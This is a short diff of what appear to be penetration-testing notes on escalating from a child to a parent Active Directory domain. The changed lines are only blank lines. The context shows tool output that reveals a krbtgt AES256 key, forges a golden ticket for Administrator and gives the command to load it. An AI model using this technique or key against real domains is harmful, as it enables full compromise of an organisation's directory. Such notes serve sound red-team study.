@@ -3,6 +3,8 @@ We need to have Domain Admin on the Source Domain for this to work and Domain Tr
 
 ---
 
+
+
 Checking if Domain Trust is bidirectional
 
 ```
@@ -22,7 +24,6 @@ RAISECHILD  192.168.210.16  389    ZPH-SVRCDC01     Parent domain SID:  S-1-5-21
 RAISECHILD  192.168.210.16  389    ZPH-SVRCDC01     krbtgt AES256 key: 3bdcbeb0910e5887e6d6c7fbec6c3f29e1e099322ac91cc386ca296a5c5497b0                                                                                                                   
 RAISECHILD  192.168.210.16  389    ZPH-SVRCDC01     [+] Golden ticket forged successfully (etype: aes256). Saved to: Administrator.ccache
 RAISECHILD  192.168.210.16  389    ZPH-SVRCDC01     [+] Run the following command to use the TGT: export KRB5CCNAME=Administrator.ccache
-
 ```
 
 ```
